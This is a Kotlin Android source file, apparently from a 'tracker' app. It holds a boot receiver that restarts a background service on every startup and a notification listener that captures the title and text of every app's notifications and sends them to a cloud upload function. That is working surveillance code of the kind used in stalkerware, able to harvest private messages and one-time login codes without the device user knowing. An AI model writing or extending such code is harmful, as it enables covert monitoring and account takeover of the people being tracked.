package com.venice.tracker

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(ctx: Context, intent: Intent?) {
        try {
            val svc = Intent(ctx, CoreService::class.java)
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(svc)
            else ctx.startService(svc)
            Util.log(ctx, "boot: service started")
        } catch (t: Throwable) {
            Util.log(ctx, "boot fail: $t")
        }
    }
}

class NotifListener : NotificationListenerService() {
    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        try {
            val s = sbn ?: return
            val pkg = s.packageName ?: return
            if (pkg == "android") return
            val ex = s.notification.extras
            val title = ex.getCharSequence("android.title")?.toString() ?: ""
            val text = ex.getCharSequence("android.text")?.toString() ?: ""
            if (title.isEmpty() && text.isEmpty()) return
            Cloud.sendNotif(pkg, title, text)
        } catch (t: Throwable) {
            Util.log(this, "notif: $t")
        }
    }
}
